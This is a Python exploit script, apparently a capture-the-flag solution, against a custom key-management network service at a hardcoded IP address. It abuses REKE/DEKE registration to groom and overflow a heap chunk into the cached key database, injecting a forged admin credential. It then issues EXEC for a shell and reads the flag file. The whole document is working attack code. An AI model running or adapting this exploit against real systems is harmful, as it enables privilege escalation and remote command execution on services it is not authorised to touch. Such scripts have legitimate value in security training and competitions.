#!/usr/bin/env python3
import socket
import sys
import time


HOST = sys.argv[1] if len(sys.argv) > 1 else "154.57.164.82"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 31149


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(f"connection closed while waiting for {marker!r}")
        data.extend(chunk)
    return bytes(data)


def sendline(sock: socket.socket, data: bytes) -> None:
    sock.sendall(data + b"\n")


def recv_available(sock: socket.socket, timeout: float = 0.4) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except TimeoutError:
            return bytes(data)
        if not chunk:
            return bytes(data)
        data.extend(chunk)


def register(sock: socket.socket, key: bytes) -> int:
    sendline(sock, b"REKE " + key)
    reply = recv_until(sock, b"\n")
    marker = b"ID->"
    if marker not in reply:
        raise RuntimeError(f"registration failed: {reply!r}")
    return int(reply.split(marker, 1)[1].strip())


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=5.0) as sock:
        fake_admin = b"ciyah:admin fakekey;"

        # Keep the fake credential in slot 1. Authentication will later parse
        # its role as "admin", once it also appears in the cached database.
        auth_id = register(sock, fake_admin)

        # Reserve the 0x60-sized heap chunk immediately before LoadKeysDB's
        # allocation, then make AUTH cache the database on the heap.
        overwrite_id = register(sock, b"temp:temp " + b"A" * 20 + b";")
        sendline(sock, b"AUTH " + str(auth_id).encode())
        recv_until(sock, b"authentication. \n")

        # Recycle the reserved chunk and overflow it into the adjacent DB:
        # 0x54 bytes user area + 4 bytes alignment + 8-byte next-chunk size.
        sendline(sock, b"DEKE " + str(overwrite_id).encode())
        recv_until(sock, b"successfuly. \n")

        payload = b"DB_overwrite:ow_payload "
        payload += b"B" * (0x54 - len(payload))
        payload += b"X" * 4
        payload += b"C" * 8
        payload += fake_admin
        register(sock, payload)

        sendline(sock, b"AUTH " + str(auth_id).encode())
        auth_reply = recv_available(sock, timeout=0.8)
        if b":admin" not in auth_reply:
            raise RuntimeError(f"admin injection failed: {auth_reply!r}")
        # The response can arrive over multiple reads; allow the server to
        # finish updating its global authentication state before EXEC.
        time.sleep(0.2)
        sendline(sock, b"EXEC")
        shell_reply = recv_until(sock, b"$ ", timeout=5.0)

        sendline(sock, b"cat flag.txt 2>/dev/null || cat /flag.txt 2>/dev/null")
        flag_reply = recv_until(sock, b"}", timeout=5.0)
        output = auth_reply + shell_reply + flag_reply
        print(output.decode(errors="replace"))


if __name__ == "__main__":
    main()
